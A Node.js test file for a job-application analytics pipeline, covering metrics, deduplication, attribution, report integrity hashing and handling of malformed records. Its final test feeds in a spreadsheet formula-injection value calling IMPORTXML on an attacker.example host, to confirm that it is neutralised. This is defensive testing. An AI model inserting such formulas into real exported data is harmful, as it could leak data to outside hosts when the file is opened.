import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  analyticsCompleteMetadataErrors,
  analyticsDetailPersistenceErrors,
  analyticsResultKey,
  analyticsSourceIntegrityErrors,
  buildAnalyticsReport,
  deduplicateAnalyticsRecords,
  latestCompleteAnalyticsReport,
  reusableAnalyticsReport,
  validateAnalyticsPolicy
} from "../src/analytics.mjs";

const loadJson = async (path) =>
  JSON.parse(await readFile(new URL(path, import.meta.url), "utf8"));
const schema = await loadJson("../config/pipeline-schema.json");
const policy = await loadJson("../config/analytics-policy.json");
const fixture = await loadJson("./fixtures/analytics-cohort.json");
const now = "2026-07-28T12:00:00.000Z";

const row = (report, metricKey, dimension = "overall", segmentKey = "all") =>
  report.rows.find(
    (candidate) =>
      candidate.metric_key === metricKey &&
      candidate.dimension === dimension &&
      candidate.segment_key === segmentKey
  );

test("analytics policy versions all bands, attribution, timezone, and output contracts", () => {
  assert.deepEqual(validateAnalyticsPolicy(policy), []);
  assert.equal(policy.analysis_window.type, "all_time");
  assert.equal(policy.analysis_timezone, "Asia/Manila");
  assert.deepEqual(policy.schedule, {
    field: "days",
    days_interval: 1,
    trigger_at_hour: 2,
    trigger_at_minute: 0
  });
  assert.equal(policy.attribution.policy, "multi_touch_full_credit");

  const invalid = structuredClone(policy);
  invalid.score_bands[1].maximum = 10;
  invalid.analysis_timezone = "Invalid/Timezone";
  invalid.schedule.trigger_at_hour = 24;
  invalid.attribution.non_additive_dimensions = [];
  invalid.execution_timeout_seconds = invalid.schedule_hours * 60 * 60;
  const errors = validateAnalyticsPolicy(invalid).join("\n");
  assert.match(errors, /score_bands must be ordered/);
  assert.match(errors, /supported IANA timezone/);
  assert.match(errors, /trigger_at_hour must be from 0 through 23/);
  assert.match(errors, /non-additive dimensions are incomplete/);
  assert.match(
    errors,
    /execution timeout must be shorter than the analytics schedule/
  );
});

test("overall conversion deduplicates active/archive overlap and uses cumulative outcomes", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  assert.equal(report.completion.record_count, 8);
  assert.equal(report.completion.application_count, 5);
  assert.equal(report.diagnostics.overlap_records, 1);
  assert.equal(row(report, "application_count").value, 5);
  assert.deepEqual(
    [
      row(report, "reply_rate"),
      row(report, "interview_rate"),
      row(report, "offer_rate"),
      row(report, "rejection_rate"),
      row(report, "no_response_rate")
    ].map((metric) => [
      metric.numerator,
      metric.denominator,
      metric.value
    ]),
    [
      [2, 5, 0.4],
      [2, 5, 0.4],
      [1, 5, 0.2],
      [1, 5, 0.2],
      [1, 5, 0.2]
    ]
  );
  assert.equal(row(report, "replied_per_ten_applications").value, 4);
  assert.equal(row(report, "interview_per_ten_applications").value, 4);
  assert.equal(row(report, "offer_per_ten_applications").value, 2);
  assert.deepEqual(
    [
      row(report, "explicit_outcome_application_coverage").numerator,
      row(report, "explicit_outcome_application_coverage").denominator,
      row(report, "explicit_outcome_application_coverage").value
    ],
    [4, 5, 0.8]
  );
  assert.equal(report.records.find(
    (record) => record.canonical_job_id === "onlinejobs.ph:9001"
  ).outcome_events.length, 3);
});

test("discovery volume and promising unsupported requirements remain distinct from conversion", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  const n8nVolume = row(
    report,
    "discovered_job_count",
    "search_query",
    "n8n developer"
  );
  assert.equal(n8nVolume.value, 2);
  assert.equal(n8nVolume.non_additive, true);
  assert.match(n8nVolume.note, /not conversion evidence/i);

  const missing = row(
    report,
    "promising_job_request_count",
    "missing_requirement",
    "Kubernetes"
  );
  assert.equal(missing.numerator, 1);
  assert.equal(missing.denominator, 2);
  assert.match(missing.note, /unsupported by approved profile evidence/i);
  const coverage = row(
    report,
    "promising_job_gap_coverage",
    "missing_requirement",
    "all"
  );
  assert.deepEqual(
    [coverage.numerator, coverage.denominator, coverage.value],
    [2, 2, 1]
  );
});

test("multi-touch dimensions are full-credit, non-additive, and deterministically labeled", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  const n8n = row(
    report,
    "application_count",
    "search_query",
    "n8n developer"
  );
  const typescript = row(
    report,
    "application_count",
    "search_query",
    "typescript developer"
  );
  assert.equal(n8n.value, 2);
  assert.equal(typescript.value, 2);
  assert.equal(n8n.non_additive, true);
  assert.equal(n8n.attribution, "multi_touch_full_credit");
  assert.match(n8n.note, /Non-additive/);

  const queryApplicationRows = report.rows.filter(
    (candidate) =>
      candidate.dimension === "search_query" &&
      candidate.metric_key === "application_count"
  );
  assert.ok(
    queryApplicationRows.reduce(
      (sum, candidate) => sum + candidate.value,
      0
    ) > report.completion.application_count
  );
  assert.equal(
    row(
      report,
      "application_count",
      "matched_skill",
      "TypeScript"
    ).value,
    2
  );
});

test("score, salary, age, points, strategy, instruction, and rank dimensions disclose unknowns", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  const expectedUnknown = {
    qualification_score_band: 1,
    opportunity_score_band: 1,
    salary_band: 1,
    posting_age_band: 1,
    apply_points_used: 1,
    message_strategy: 2,
    instruction_completeness: 1,
    rank_cohort: 1
  };
  for (const [dimension, unknownCount] of Object.entries(expectedUnknown)) {
    assert.equal(
      row(report, "application_count", dimension, "unknown").value,
      unknownCount,
      `${dimension} unknown bucket is incorrect`
    );
    const coverage = row(
      report,
      "known_application_coverage",
      dimension,
      "all"
    );
    assert.equal(coverage.numerator, 5 - unknownCount);
    assert.equal(coverage.denominator, 5);
  }
  assert.equal(
    row(
      report,
      "application_count",
      "qualification_score_band",
      "80_100"
    ).value,
    1
  );
  assert.equal(
    row(report, "application_count", "salary_band", "80k_plus").value,
    1
  );
  assert.equal(
    row(
      report,
      "application_count",
      "instruction_completeness",
      "complete"
    ).value,
    2
  );
  assert.equal(
    row(
      report,
      "application_count",
      "instruction_completeness",
      "incomplete"
    ).value,
    2
  );
  assert.equal(
    row(report, "application_count", "rank_cohort", "top_ranked").value,
    1
  );
  assert.equal(
    row(report, "application_count", "rank_cohort", "lower_ranked").value,
    3
  );
});

test("Apply Point efficiency uses known positive points and application-time confidence", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  const replies = row(report, "replies_per_apply_point");
  const interviews = row(report, "interviews_per_apply_point");
  const highConfidence = row(report, "high_confidence_points_share");
  assert.deepEqual(
    [replies.numerator, replies.denominator, replies.value],
    [2, 20, 0.1]
  );
  assert.deepEqual(
    [interviews.numerator, interviews.denominator, interviews.value],
    [2, 20, 0.1]
  );
  assert.deepEqual(
    [highConfidence.numerator, highConfidence.denominator, highConfidence.value],
    [13, 20, 0.65]
  );
  const coverage = row(report, "known_apply_points_application_coverage");
  assert.deepEqual(
    [coverage.numerator, coverage.denominator, coverage.value],
    [4, 5, 0.8]
  );
});

test("time-to-action metrics use valid timestamps and Manila calendar boundaries", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  const sameDay = row(report, "same_day_first_review_rate");
  assert.deepEqual(
    [
      sameDay.numerator,
      sameDay.denominator,
      sameDay.value,
      sameDay.coverage_numerator,
      sameDay.coverage_denominator
    ],
    [2, 3, 0.666667, 3, 8]
  );
  assert.match(sameDay.note, /Asia\/Manila/);
  assert.equal(
    row(report, "invalid_review_timestamp_count").value,
    1
  );
  assert.equal(
    row(report, "mean_hours_discovery_to_application").coverage_denominator,
    5
  );
});

test("hard-gap avoidance and pack blocker categories are independently countable", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  assert.equal(
    row(
      report,
      "hard_gap_non_application_count",
      "requirement_gap",
      "hard"
    ).value,
    1
  );
  assert.equal(
    row(
      report,
      "packs_blocked_missing_instructions",
      "application_pack",
      "packs_blocked_missing_instructions"
    ).value,
    1
  );
  assert.equal(
    row(
      report,
      "packs_blocked_unsupported_evidence",
      "application_pack",
      "packs_blocked_unsupported_evidence"
    ).value,
    1
  );
});

test("configured score and posting-age boundaries are inclusive and ordered", () => {
  const applications = [24, 44, 64, 79, 100].map((score, index) => ({
    source: "onlinejobs.ph",
    source_job_id: String(9100 + index),
    canonical_job_id: `onlinejobs.ph:${9100 + index}`,
    canonical_url: `https://onlinejobs.ph/jobseekers/job/boundary-${9100 + index}`,
    pipeline_status: "applied",
    application_decision: "applied",
    application_snapshot_at: `2026-07-0${index + 1}T00:00:00.000Z`,
    application_decided_at: `2026-07-0${index + 1}T00:00:00.000Z`,
    application_qualification_score: score,
    application_opportunity_score: score,
    application_posting_age_days: [1, 3, 7, 14, 15][index],
    outcome_events: []
  }));
  const report = buildAnalyticsReport(applications, [], schema, policy, now);
  for (const band of policy.score_bands) {
    assert.equal(
      row(
        report,
        "application_count",
        "qualification_score_band",
        band.key
      ).value,
      1
    );
  }
  for (const band of policy.posting_age_bands) {
    assert.equal(
      row(
        report,
        "application_count",
        "posting_age_band",
        band.key
      ).value,
      1
    );
  }
});

test("empty input produces a complete explicit report without divide-by-zero values", () => {
  const report = buildAnalyticsReport([], [], schema, policy, now);
  assert.equal(report.completion.status, "complete");
  assert.equal(report.completion.record_count, 0);
  assert.equal(report.completion.application_count, 0);
  assert.match(report.completion.warning_summary, /no_applications/);
  assert.equal(row(report, "reply_rate").numerator, 0);
  assert.equal(row(report, "reply_rate").denominator, 0);
  assert.equal(row(report, "reply_rate").value, "");
  assert.ok(
    report.rows.every(
      (candidate) =>
        candidate.report_id === report.completion.report_id &&
        candidate.analytics_row_id
    )
  );
});

test("latest complete report ignores partial and malformed refreshes", () => {
  const old = buildAnalyticsReport(
    [],
    [],
    schema,
    policy,
    "2026-07-27T00:00:00.000Z"
  ).completion;
  const completeNew = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    "2026-07-28T01:00:00.000Z"
  ).completion;
  assert.deepEqual(analyticsCompleteMetadataErrors(completeNew), []);
  const reports = [
    old,
    {
      ...completeNew,
      report_id:
        `analytics-2026-07-28-v1-${"a".repeat(64)}`,
      status: "writing",
      generated_at: "2026-07-28T00:00:00.000Z"
    },
    completeNew,
    {
      ...completeNew,
      report_id:
        `analytics-2026-07-28-v1-${"b".repeat(64)}`,
      generated_at: "not-a-date"
    }
  ];
  assert.equal(
    latestCompleteAnalyticsReport([
      ...reports,
      {
        ...completeNew,
        report_id:
          `analytics-2026-07-28-v1-${"c".repeat(64)}`,
        generated_at: "2026-07-29T01:00:00.000Z",
        window_end_at: "2026-07-29T01:00:00.000Z",
        detail_row_count: "invalid"
      }
    ]).report_id,
    completeNew.report_id,
    "malformed newer complete metadata must not displace a valid report"
  );
  assert.equal(
    latestCompleteAnalyticsReport([
      ...reports,
      {
        ...completeNew,
        report_id: completeNew.report_id.toUpperCase()
      }
    ]),
    undefined,
    "a folded duplicate of the newest complete metadata is ambiguous"
  );
  assert.match(
    analyticsCompleteMetadataErrors({
      ...completeNew,
      window_end_at: "invalid"
    }).join("\n"),
    /window/
  );
  assert.equal(latestCompleteAnalyticsReport([]), undefined);
});

test("analytics result identity is content-addressed and safely reusable", () => {
  const first = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now,
    { runId: "first-execution" }
  );
  const unchangedLater = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    "2026-07-29T12:00:00.000Z",
    { runId: "second-execution" }
  );
  assert.equal(unchangedLater.completion.report_id, first.completion.report_id);
  assert.equal(unchangedLater.metadata.result_key, first.metadata.result_key);

  const existing = {
    ...first.completion,
    record_count: String(first.completion.record_count),
    application_count: String(first.completion.application_count),
    detail_row_count: String(first.completion.detail_row_count)
  };
  assert.equal(
    reusableAnalyticsReport([existing], unchangedLater.completion)?.report_id,
    first.completion.report_id
  );
  const reusableDetailFields = policy.detail_fields.filter(
    (field) => !["generated_at", "window_end_at"].includes(field)
  );
  assert.deepEqual(
    analyticsDetailPersistenceErrors(
      unchangedLater.rows,
      first.rows,
      unchangedLater.completion,
      reusableDetailFields
    ),
    [],
    "volatile refresh timestamps must not invalidate intact reusable detail"
  );
  const reusableExpectedRows = unchangedLater.rows.map((row) => ({
    ...row,
    generated_at: existing.generated_at,
    window_end_at: existing.window_end_at
  }));
  assert.deepEqual(
    analyticsDetailPersistenceErrors(
      reusableExpectedRows,
      first.rows,
      existing,
      policy.detail_fields
    ),
    [],
    "stored refresh timestamps must exactly match reusable metadata"
  );
  assert.match(
    analyticsDetailPersistenceErrors(
      reusableExpectedRows,
      [
        {
          ...first.rows[0],
          generated_at: "2026-07-27T00:00:00.000Z"
        },
        ...first.rows.slice(1)
      ],
      existing,
      policy.detail_fields
    ).join("\n"),
    /content/
  );
  assert.equal(
    reusableAnalyticsReport(
      [
        existing,
        {
          ...existing,
          report_id: "different-newer-result",
          generated_at: "2026-07-29T13:00:00.000Z"
        }
      ],
      unchangedLater.completion
    ),
    undefined,
    "a return to an older result must republish it as the current report"
  );
  assert.equal(
    reusableAnalyticsReport(
      [{ ...existing, status: "writing" }],
      unchangedLater.completion
    ),
    undefined
  );
  assert.equal(
    reusableAnalyticsReport(
      [{ ...existing, detail_row_count: "1" }],
      unchangedLater.completion
    ),
    undefined
  );

  const changedFixture = structuredClone(fixture);
  changedFixture.active[1].outcome_events = [
    ...(changedFixture.active[1].outcome_events || []),
    {
      id: "new-outcome",
      type: "replied",
      at: "2026-07-29T01:00:00.000Z"
    }
  ];
  const changed = buildAnalyticsReport(
    changedFixture.active,
    changedFixture.archive,
    schema,
    policy,
    "2026-07-29T12:00:00.000Z"
  );
  assert.notEqual(changed.completion.report_id, first.completion.report_id);
});

test("analytics completion requires one exact persisted copy of every detail row", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  assert.deepEqual(
    analyticsDetailPersistenceErrors(
      report.rows,
      report.rows,
      report.completion,
      policy.detail_fields
    ),
    []
  );
  assert.match(
    analyticsDetailPersistenceErrors(
      report.rows,
      report.rows.slice(1),
      report.completion,
      policy.detail_fields
    ).join("\n"),
    /count|identity/
  );
  assert.match(
    analyticsDetailPersistenceErrors(
      report.rows,
      [
        ...report.rows,
        {
          ...report.rows[0],
          analytics_row_id:
            report.rows[0].analytics_row_id.toUpperCase(),
          report_id: report.completion.report_id.toUpperCase()
        }
      ],
      report.completion,
      policy.detail_fields
    ).join("\n"),
    /count|unique/
  );
  assert.match(
    analyticsDetailPersistenceErrors(
      report.rows,
      [
        {
          ...report.rows[0],
          value: "tampered"
        },
        ...report.rows.slice(1)
      ],
      report.completion,
      policy.detail_fields
    ).join("\n"),
    /content/
  );
});

test("analytics consumers verify exact identities, metadata, and content hash", () => {
  const report = buildAnalyticsReport(
    fixture.active,
    fixture.archive,
    schema,
    policy,
    now
  );
  assert.deepEqual(
    analyticsSourceIntegrityErrors(report.rows, report.completion),
    []
  );
  assert.match(
    analyticsSourceIntegrityErrors(
      [
        ...report.rows,
        {
          ...report.rows[0],
          analytics_row_id:
            report.rows[0].analytics_row_id.toUpperCase(),
          report_id: report.completion.report_id.toUpperCase()
        }
      ],
      report.completion
    ).join("\n"),
    /count|identity/
  );
  assert.match(
    analyticsSourceIntegrityErrors(
      [
        {
          ...report.rows[0],
          value: "tampered"
        },
        ...report.rows.slice(1)
      ],
      report.completion
    ).join("\n"),
    /content hash/
  );
  assert.match(
    analyticsSourceIntegrityErrors(
      [
        {
          ...report.rows[0],
          window_end_at: "2026-07-29T00:00:00.000Z"
        },
        ...report.rows.slice(1)
      ],
      report.completion
    ).join("\n"),
    /metadata/
  );
});

test("analytics result keys use SHA-256 over Unicode-safe canonical evidence", () => {
  const rows = [
    {
      metric_definition_version: "2026-07-28/v1",
      band_version: "2026-07-28/v1",
      window_type: "all_time",
      window_start_at: "2026-07-01T00:00:00.000Z",
      section: "conversion",
      dimension: "search_query",
      segment_key: "mañana",
      segment_label: "Mañana",
      metric_key: "reply_rate",
      numerator: 1,
      denominator: 2,
      value: 0.5,
      unit: "rate",
      sample_size: 2,
      coverage_numerator: 2,
      coverage_denominator: 2,
      attribution: "multi_touch_full_credit",
      non_additive: true,
      note: ""
    }
  ];
  const summary = {
    analysis_timezone: "Asia/Manila",
    record_count: 2,
    application_count: 2,
    attribution_policy: "multi_touch_full_credit",
    warning_summary: ""
  };
  const canonical = JSON.stringify({
    key_version: "analytics-result/v1",
    ...summary,
    rows: [
      [
        "2026-07-28/v1",
        "2026-07-28/v1",
        "all_time",
        "2026-07-01T00:00:00.000Z",
        "conversion",
        "search_query",
        "mañana",
        "Mañana",
        "reply_rate",
        1,
        2,
        0.5,
        "rate",
        2,
        2,
        2,
        "multi_touch_full_credit",
        true,
        ""
      ]
    ]
  });
  assert.equal(
    analyticsResultKey(rows, summary),
    createHash("sha256").update(canonical).digest("hex")
  );
});

test("deduplication reports invalid identities and immutable snapshot conflicts", () => {
  const first = {
    ...fixture.active[0],
    application_opportunity_score: 90,
    requirement_gap_details: [
      { requirement: "Kubernetes", classification: "hard" }
    ]
  };
  const conflicting = {
    ...fixture.archive[0],
    canonical_job_id: fixture.archive[0].canonical_job_id.toUpperCase(),
    application_opportunity_score: 10,
    application_snapshot_at: "2026-07-02T04:00:00.000Z"
  };
  const result = deduplicateAnalyticsRecords(
    [first, { job_title: "No identity" }],
    [conflicting],
    schema,
    now
  );
  assert.equal(result.records.length, 1);
  assert.equal(result.records[0].application_opportunity_score, 90);
  assert.deepEqual(result.records[0].requirement_gap_details, [
    { requirement: "Kubernetes", classification: "hard" }
  ]);
  assert.equal(
    result.records[0].canonical_job_id,
    fixture.active[0].canonical_job_id
  );
  assert.equal(result.diagnostics.invalid_identity_rows, 1);
  assert.equal(result.diagnostics.overlap_records, 1);
  assert.equal(result.diagnostics.application_snapshot_conflicts, 1);
});

test("malformed legacy outcome history is disclosed instead of fabricating milestones", () => {
  const malformed = {
    ...fixture.active[2],
    source_job_id: "9990",
    canonical_job_id: "onlinejobs.ph:9990",
    canonical_url:
      "https://onlinejobs.ph/jobseekers/job/malformed-history-9990",
    outcome: "replied",
    outcome_events: "{not-json"
  };
  const report = buildAnalyticsReport(
    [malformed],
    [],
    schema,
    policy,
    now
  );
  assert.equal(row(report, "reply_rate").numerator, 1);
  assert.equal(
    row(report, "malformed_outcome_history_row_count").value,
    1
  );
  assert.match(
    report.completion.warning_summary,
    /malformed_outcome_history_rows/
  );
  assert.equal(row(report, "interview_rate").numerator, 0);
});

test("malformed application snapshots stay unknown and cannot bias point efficiency", () => {
  const invalid = {
    source: "onlinejobs.ph",
    source_job_id: "9991",
    canonical_job_id: "onlinejobs.ph:9991",
    canonical_url:
      "https://onlinejobs.ph/jobseekers/job/invalid-snapshot-9991",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-20T12:00:00.000Z",
    application_snapshot_at: "2026-07-20T12:00:00.000Z",
    application_qualification_score: -1,
    application_opportunity_score: 101,
    application_ranking_confidence: "certain",
    application_apply_points_recommendation: "maximum",
    application_pack_status_at_apply: "complete",
    application_posting_age_days: -3,
    application_message_strategy: "=unsafe",
    apply_points_used: 61,
    outcome: "replied",
    outcome_at: "2026-07-21T12:00:00.000Z",
    outcome_events: [
      {
        id: "9991-reply",
        type: "replied",
        at: "2026-07-21T12:00:00.000Z"
      }
    ]
  };
  const report = buildAnalyticsReport(
    [invalid],
    [],
    schema,
    policy,
    now
  );
  for (const dimension of [
    "qualification_score_band",
    "opportunity_score_band",
    "confidence",
    "posting_age_band",
    "apply_points_used",
    "apply_points_recommendation",
    "message_strategy",
    "instruction_completeness",
    "rank_cohort"
  ]) {
    assert.equal(
      row(report, "application_count", dimension, "unknown").value,
      1,
      `${dimension} accepted a contract-invalid snapshot`
    );
  }
  assert.deepEqual(
    [
      row(report, "known_apply_points_application_coverage").numerator,
      row(report, "replies_per_apply_point").denominator,
      row(report, "high_confidence_points_share").denominator
    ],
    [0, 0, 0]
  );
});

test("malformed gap and pack arrays lower coverage without failing the report", () => {
  const malformed = {
    source: "onlinejobs.ph",
    source_job_id: "9992",
    canonical_job_id: "onlinejobs.ph:9992",
    canonical_url:
      "https://onlinejobs.ph/jobseekers/job/malformed-learning-9992",
    pipeline_status: "recommended",
    opportunity_score:
      policy.top_ranked.minimum_application_opportunity_score,
    scoring_policy_version: "2026-07-28/v1",
    evaluated_at: "2026-07-20T12:00:00.000Z",
    requirement_gap_details: "{not-json",
    application_pack_status: "blocked",
    application_warnings: "{not-json"
  };
  const report = buildAnalyticsReport(
    [malformed],
    [],
    schema,
    policy,
    now
  );
  assert.equal(report.completion.status, "complete");
  assert.equal(report.diagnostics.malformed_requirement_gap_rows, 1);
  assert.equal(report.diagnostics.malformed_application_warning_rows, 1);
  const coverage = row(
    report,
    "promising_job_gap_coverage",
    "missing_requirement",
    "all"
  );
  assert.deepEqual([coverage.numerator, coverage.denominator], [0, 1]);
  assert.equal(
    row(
      report,
      "hard_gap_non_application_count",
      "requirement_gap",
      "hard"
    ).value,
    0
  );
  assert.equal(
    row(
      report,
      "packs_blocked_unsupported_evidence",
      "application_pack",
      "packs_blocked_unsupported_evidence"
    ).value,
    0
  );
  assert.match(
    report.completion.warning_summary,
    /malformed_requirement_gap_rows/
  );
  assert.match(
    report.completion.warning_summary,
    /malformed_application_warning_rows/
  );
});

test("analytics rows neutralize spreadsheet formulas and scope IDs to one result", () => {
  const malicious = {
    ...fixture.active[0],
    source_job_id: "9991",
    canonical_job_id: "onlinejobs.ph:9991",
    canonical_url:
      "https://onlinejobs.ph/jobseekers/job/malicious-skill-9991",
    match_reasons: ["Matched skill: =IMPORTXML(\"https://attacker.example\")"]
  };
  const report = buildAnalyticsReport(
    [malicious],
    [],
    schema,
    policy,
    now,
    { runId: "execution-42" }
  );
  assert.match(
    report.completion.report_id,
    /^analytics-2026-07-28-v1-[a-f0-9]{64}$/
  );
  const skill = report.rows.find(
    (candidate) =>
      candidate.dimension === "matched_skill" &&
      candidate.metric_key === "application_count"
  );
  assert.match(skill.segment_key, /^'/);
  assert.match(skill.segment_label, /^'/);
});
